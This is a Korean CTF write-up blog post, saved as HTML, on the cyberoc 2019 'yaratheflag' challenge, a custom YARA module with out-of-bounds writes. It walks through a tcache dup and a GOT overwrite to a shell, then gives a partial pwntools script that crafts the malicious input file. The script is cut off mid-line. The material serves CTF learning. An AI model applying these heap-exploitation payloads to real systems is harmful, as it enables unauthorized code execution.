@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-mac-osx.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://mhibio.github.io').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"mac"},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":true,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":5},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+
+  <meta name="description" content="[ 2019 cyberoc ] yaratheflag Funny ↗binary summary  yara tcache dup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[ cyberoc 2019 ] yaratheflag">
+<meta property="og:url" content="http://mhibio.github.io/2020/04/03/2019-cyberoc-yaratheflag/index.html">
+<meta property="og:site_name" content="just..pwn">
+<meta property="og:description" content="[ 2019 cyberoc ] yaratheflag Funny ↗binary summary  yara tcache dup">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-03T14:31:28.000Z">
+<meta property="article:modified_time" content="2020-04-05T11:33:51.284Z">
+<meta property="article:author" content="mhibio">
+<meta property="article:tag" content="cyberoc 2019 prequal">
+<meta property="article:tag" content="yara">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://mhibio.github.io/2020/04/03/2019-cyberoc-yaratheflag/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>[ cyberoc 2019 ] yaratheflag | just..pwn</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-157366678-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-157366678-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/rss2.xml" title="just..pwn" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">just..pwn</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">pwn pwn pwn</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-reward">
+
+    <a href="/reward/" rel="section"><i class="fa fa-fw fa-archive"></i>reward</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">18</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories<span class="badge">3</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://mhibio.github.io/2020/04/03/2019-cyberoc-yaratheflag/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="mhibio">
+      <meta itemprop="description" content="Defenit / KDMHS 18">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="just..pwn">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [ cyberoc 2019 ] yaratheflag
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-03 23:31:28" itemprop="dateCreated datePublished" datetime="2020-04-03T23:31:28+09:00">2020-04-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-05 20:33:51" itemprop="dateModified" datetime="2020-04-05T20:33:51+09:00">2020-04-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwnable/" itemprop="url" rel="index">
+                    <span itemprop="name">pwnable</span>
+                  </a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2020/04/03/2019-cyberoc-yaratheflag/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/04/03/2019-cyberoc-yaratheflag/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>5.5k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>5 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1>[ 2019 cyberoc ] yaratheflag</h1>
+<p><code>Funny</code></p>
+<h2 id="binary-summary"><a class="header-anchor" href="#binary-summary">↗</a>binary summary</h2>
+<ul>
+<li>yara</li>
+<li>tcache dup</li>
+</ul>
+<a id="more"></a>
+<h2 id="Analyze"><a class="header-anchor" href="#Analyze">↗</a>Analyze</h2>
+<p><code>glibc 2.28, tcache</code>환경이다.<br>
+일반적인 <code>yara</code>에 추가적으로 모듈을 포함시켜 빌드했는데,<br>
+모듈에서 취약점을 찾아 <code>shell</code>을 취득하면 된다.</p>
+<h3 id="Mitigation"><a class="header-anchor" href="#Mitigation">↗</a>Mitigation</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/home/mhibio/pwn/yara-the-flag/yara'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></tbody></table></figure>
+<p><code>got overwrite</code>로 해야할 것 같다.</p>
+<h3 id="build"><a class="header-anchor" href="#build">↗</a>build</h3>
+<p>제공되는 <code>Dockerfile</code>과 <code>Build_Yara.sh</code>를 이용하면 간단하게 환경구성이 가능하다.<br>
+나는 좀더 편한 디버깅을 위해서 로컬을 사용했다.</p>
+<h3 id="patchfile"><a class="header-anchor" href="#patchfile">↗</a>patchfile</h3>
+<p>어떠한 패치를 진행하고 빌드를 한뒤 패치파일을 문제에 포함시켜줬다.</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">diff -ruN yara-3.10.0/libyara/Makefile.am yara-3.10.0-patched/libyara/Makefile.am</span><br><span class="line">+MODULES += modules/secret.c</span><br><span class="line">+MODULE(secret)</span><br></pre></td></tr></tbody></table></figure>
+<p>일부를 살펴보면 다음과 같이 <code>secret.c</code>라는 모듈을 추가했다.<br>
+해당 모듈을 분석하면 된다.</p>
+<h3 id="Memory-block"><a class="header-anchor" href="#Memory-block">↗</a>Memory block</h3>
+<p><code>secret.h</code>파일을 보면 사용하는 구조체들을 확인할 수 있다.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLOCK_SIZE 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GH_MAGIC 0x52434553             <span class="comment">// SECR</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONTAINER_MAGIC 0x524e5443      <span class="comment">// CTNR</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNIT_MAGIC 0x54494e55           <span class="comment">// UNIT</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GlobalHeader_s</span> {</span></span><br><span class="line">	<span class="keyword">uint32_t</span> magic;</span><br><span class="line">	<span class="keyword">uint32_t</span> containerCnt;</span><br><span class="line">	<span class="keyword">uint32_t</span> containerHead;</span><br><span class="line">	<span class="keyword">uint32_t</span> containerCapacity;</span><br><span class="line">	<span class="keyword">uint8_t</span> reserved[<span class="number">16</span>];</span><br><span class="line">}__attribute__((packed)) GlobalHeader_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Container_s</span> {</span></span><br><span class="line">	<span class="keyword">uint32_t</span> magic;</span><br><span class="line">	<span class="keyword">uint32_t</span> unitCnt;</span><br><span class="line">	<span class="keyword">uint32_t</span> unitVector;</span><br><span class="line">	<span class="keyword">uint32_t</span> next;</span><br><span class="line">	<span class="keyword">uint64_t</span> containerID;</span><br><span class="line">	<span class="keyword">uint8_t</span> reserved[<span class="number">8</span>];</span><br><span class="line">}__attribute__((packed)) Container_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Unit_s</span> {</span></span><br><span class="line">	<span class="keyword">uint32_t</span> magic;</span><br><span class="line">	<span class="keyword">uint8_t</span> unitData[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">uint8_t</span> unitKey[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">uint64_t</span> unitID;</span><br><span class="line">	<span class="keyword">uint8_t</span> reserved[<span class="number">4</span>];</span><br><span class="line">}__attribute__((packed)) Unit_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">UnitEntry_s</span> {</span></span><br><span class="line">	<span class="keyword">uint8_t</span> *unitData;</span><br><span class="line">	<span class="keyword">uint8_t</span> *unitKey;</span><br><span class="line">} UnitEntry_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ContainerEntry_s</span> {</span></span><br><span class="line">	<span class="keyword">uint32_t</span> unitCnt;</span><br><span class="line">	UnitEntry_t **<span class="built_in">vector</span>;</span><br><span class="line">} ContainerEntry_t;</span><br></pre></td></tr></tbody></table></figure>
+<p>블록 하나당 <strong>0x20</strong>만큼의 크기를 차지한다.<br>
+모든 <code>block</code>에 대해서 <code>magic</code>값에 대한 검사가 있다.</p>
+<blockquote>
+<p>상위 4byte는 무조건 <strong>magic</strong>값이다.</p>
+</blockquote>
+<h3 id="Working"><a class="header-anchor" href="#Working">↗</a>Working</h3>
+<p>인자로 들어온 파일을 긁어와서 각각 구조체에 넣어준다.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">block = first_memory_block(context);</span><br><span class="line">block_data = (<span class="keyword">uint8_t</span> *)block-&gt;fetch_data(block);</span><br><span class="line">  <span class="comment">// block data 긁어오기</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (block_data == <span class="literal">NULL</span> || block-&gt;<span class="built_in">size</span> &lt; <span class="keyword">sizeof</span>(header)) {</span><br><span class="line">  <span class="keyword">return</span> ERROR_INVALID_FILE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* parse the global header */</span></span><br><span class="line">header = (GlobalHeader_t *)block_data;</span><br><span class="line"><span class="keyword">if</span> (header-&gt;magic != GH_MAGIC) {</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"secret: invalid magic (%04x)\n"</span>,header-&gt;magic);</span><br><span class="line">  <span class="keyword">return</span> ERROR_INVALID_FILE;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// header의 magic은 GH_MAGIC이여야함</span></span><br><span class="line"><span class="comment">// SECR</span></span><br><span class="line"></span><br><span class="line">cur = header-&gt;containerHead;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(cur) {</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (numContainers &gt; <span class="number">0x100</span>) {</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// container = block_data + cur * BLOCK_SIZE [ 0x20 ];</span></span><br><span class="line">  <span class="keyword">if</span> (!Container_Parse(block_data, cur, &amp;container)) {</span><br><span class="line">    <span class="keyword">return</span> ERROR_INVALID_FILE;</span><br><span class="line">  }</span><br><span class="line">  cur = container.next;</span><br><span class="line">  numContainers++;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><code>block data</code>를 긁어오고, 해당 블록을 토대로 <code>Container_Parse</code>를 진행한다.</p>
+<h3 id="Vuln"><a class="header-anchor" href="#Vuln">↗</a>Vuln</h3>
+<p>2가지 <strong>oob</strong>취약점이 존재한다.</p>
+<h4 id="Unit-Parse-0"><a class="header-anchor" href="#Unit-Parse-0">↗</a>Unit_Parse(0)</h4>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>-&gt;unitData = makeStr(unit-&gt;unitData, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">new</span>-&gt;unitKey = makeStr(unit-&gt;unitKey, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">out[unit-&gt;unitID] = <span class="keyword">new</span>;</span><br><span class="line">numUnits++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></tbody></table></figure>
+<p><code>unit -&gt; unitID</code>를 조작하면 <strong>heap</strong>에서 <code>oob</code>를 만들 수 있다.</p>
+<h4 id="Container-Parse"><a class="header-anchor" href="#Container-Parse">↗</a>Container_Parse()</h4>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">entry-&gt;unitCnt = container-&gt;unitCnt;</span><br><span class="line">entry-&gt;<span class="built_in">vector</span> = (UnitEntry_t **)<span class="built_in">calloc</span>(entry-&gt;unitCnt, <span class="keyword">sizeof</span>(UnitEntry_t *));</span><br><span class="line">containers[container-&gt;containerID] = entry;</span><br></pre></td></tr></tbody></table></figure>
+<p><code>container -&gt; containerID</code>를 조작가능하다면, <strong>bss</strong>에서 <code>oob</code>를 트리거 할 수 있다.</p>
+<h3 id="UNIT-struct-trigger"><a class="header-anchor" href="#UNIT-struct-trigger">↗</a>UNIT struct trigger</h3>
+<p>취약점을 트리거하기 위해서는 <code>Unit_Parse</code>의 <code>unit</code>을 내가 원하는 <strong>block</strong>으로 지정해야한다.<br>
+<code>module_load -&gt; Container_Parse -&gt; Container_readUnits -&gt; Unit_Parse</code>순으로 함수가 호출된다.</p>
+<h4 id="Container-readUnits"><a class="header-anchor" href="#Container-readUnits">↗</a>Container_readUnits()</h4>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span> = (<span class="keyword">uint32_t</span> *)(data + BLOCK_SIZE * container-&gt;unitVector);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; container-&gt;unitCnt; i++) {</span><br><span class="line">  start = data + BLOCK_SIZE * <span class="built_in">vector</span>[i];</span><br><span class="line">  <span class="keyword">if</span> (!Unit_Parse((Unit_t *)start, containerEntry-&gt;<span class="built_in">vector</span>)) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><strong>container</strong>의 <code>unitVector, unitCnt</code>를 이용하면 내가 원하는 <code>idx8개</code>를 <code>Unit</code>으로 인자전달이 가능하다.</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Container_t</span></span><br><span class="line">pay += <span class="string">"CTNR"</span>	<span class="comment"># magic</span></span><br><span class="line">pay += p32(<span class="number">2</span>)	<span class="comment"># unitCnt</span></span><br><span class="line">pay += p32(<span class="number">2</span>)	<span class="comment"># Unitvector</span></span><br><span class="line">pay += p32(<span class="number">0</span>)	<span class="comment"># next</span></span><br><span class="line">pay += p64(<span class="number">0x100</span>)   <span class="comment"># containerID</span></span><br><span class="line">pay += p64(<span class="number">0</span>)	<span class="comment"># reserved[8]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#	uint32_t magic;</span></span><br><span class="line"><span class="comment">#	uint32_t unitCnt;</span></span><br><span class="line"><span class="comment">#	uint32_t unitVector;</span></span><br><span class="line"><span class="comment">#	uint32_t next;</span></span><br><span class="line"><span class="comment">#	uint64_t containerID;</span></span><br><span class="line"><span class="comment">#	uint8_t reserved[8];</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># idx</span></span><br><span class="line">pay += p32(<span class="number">0x3</span>)</span><br><span class="line">pay += p32(<span class="number">0x4</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>)*<span class="number">6</span></span><br></pre></td></tr></tbody></table></figure>
+<h2 id="oob"><a class="header-anchor" href="#oob">↗</a>oob</h2>
+<p>중요한 취약점은 <strong>heap</strong>에서 일어나는 <code>oob</code>이다.<br>
+<strong>heap</strong>을 이용해 <code>aaw</code>를 만들어서 <code>got overwrite</code>를 하기 위해서는 <code>tcache dup</code>이 가장 좋은 방법이다.</p>
+<p><strong>heap</strong>영역 아무곳에 원하는 값을 넣을 수 있는 상황이면,<br>
+<code>tcache entry chunk</code>의 <code>0x20</code>짜리 <strong>bin</strong>에 넣으면 <code>malloc(0x10)</code>을 통해 <code>aaw</code>을 만들 수 있다.</p>
+<h3 id="makeStr"><a class="header-anchor" href="#makeStr">↗</a>makeStr()</h3>
+<p>내용을 <code>buffer</code>에 복사하기 위해서 자체적으로 <code>makeStr</code>이라는 함수를 사용한다.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint8_t</span> *<span class="title">makeStr</span><span class="params">(<span class="keyword">uint8_t</span> *ori, <span class="keyword">size_t</span> len)</span> </span>{</span><br><span class="line">  <span class="keyword">uint8_t</span> *<span class="built_in">buffer</span> = <span class="built_in">malloc</span>(len+<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(<span class="built_in">buffer</span>, <span class="number">0</span>, len+<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(<span class="built_in">buffer</span>, ori, len);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">buffer</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>여기서 <code>malloc(0x10)</code>을 할 수 있는데, <code>oob</code>를 <code>0x20</code>짜리 <strong>bin</strong>에 넣은이유가 이때문이다.</p>
+<blockquote>
+<p>다른 size로는 할당불가, 0x20 고정</p>
+</blockquote>
+<h3 id="Got-Overwrite"><a class="header-anchor" href="#Got-Overwrite">↗</a>Got Overwrite</h3>
+<p><code>aaw</code>가 가능하므로 <code>yr_finaliz@got</code>를 주어진 원샷으로 덮으면 <strong>쉘취득</strong>이 가능하다.</p>
+<h3 id="SetAllVars"><a class="header-anchor" href="#SetAllVars">↗</a>SetAllVars()</h3>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetAllVars</span><span class="params">(YR_OBJECT *module_object)</span> </span>{</span><br><span class="line">  <span class="keyword">uint32_t</span> i, j;</span><br><span class="line">  set_integer(numContainers, module_object, <span class="string">"numContainers"</span>);</span><br><span class="line">  set_integer(maxUnitsPerContainer, module_object, <span class="string">"maxUnitsPerContainer"</span>);</span><br><span class="line">  set_integer(numUnits, module_object, <span class="string">"numUnits"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) {</span><br><span class="line">    <span class="keyword">if</span> (!containers[i]) {</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    } <span class="comment">// 컨테이너 한번씩 다 돌면서</span></span><br><span class="line">    set_integer(containers[i]-&gt;unitCnt, module_object, <span class="string">"containers[%i].unitCnt"</span>,i);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; containers[i]-&gt;unitCnt; j++) {</span><br><span class="line">      UnitEntry_t *u = containers[i]-&gt;<span class="built_in">vector</span>[j];</span><br><span class="line">      set_string(u-&gt;unitData, module_object, <span class="string">"containers[%i].units[%i].unitData"</span>,i,j);</span><br><span class="line">      set_string(u-&gt;unitKey, module_object, <span class="string">"containers[%i].units[%i].unitKey"</span>,i,j);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>마무리 루틴으로 <code>SetAllVars</code>를 호출하는데,<br>
+<strong>containers[0x100]</strong> 배열에 값이 존재하면 별도의 처리과정을 해준다.<br>
+이때 값이 존재한다면 <code>error scanning test: error: 4</code>구문과 함께 오류를 띄어준다.<br>
+<code>main</code>에서 <code>yr_finalize</code>를 호출하기때문에 쉘취득과는 상관이없지만,<br>
+익스를 짤때 꼬여버릴 수 있기때문에 <code>containers[]</code>의 인덱스를 <code>containers[0x100]</code>로 맞추어서 <code>SetAllVars</code>루틴을 넘어가도록했다.</p>
+<h2 id="Exploit"><a class="header-anchor" href="#Exploit">↗</a>Exploit</h2>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"test"</span>, <span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">"SECR"</span></span><br><span class="line">pay += p32(<span class="number">0</span>)</span><br><span class="line">pay += p32(<span class="number">1</span>)</span><br><span class="line">pay += p32(<span class="number">0x1000000</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">pay += <span class="string">"CTNR"</span></span><br><span class="line">pay += p32(<span class="number">2</span>)</span><br><span class="line">pay += p32(<span class="number">2</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>)</span><br><span class="line">pay += p64(<span class="number">0x100</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pay += p32(<span class="number">0x3</span>)</span><br><span class="line">pay += p32(<span class="number">0x4</span>)</span><br><span 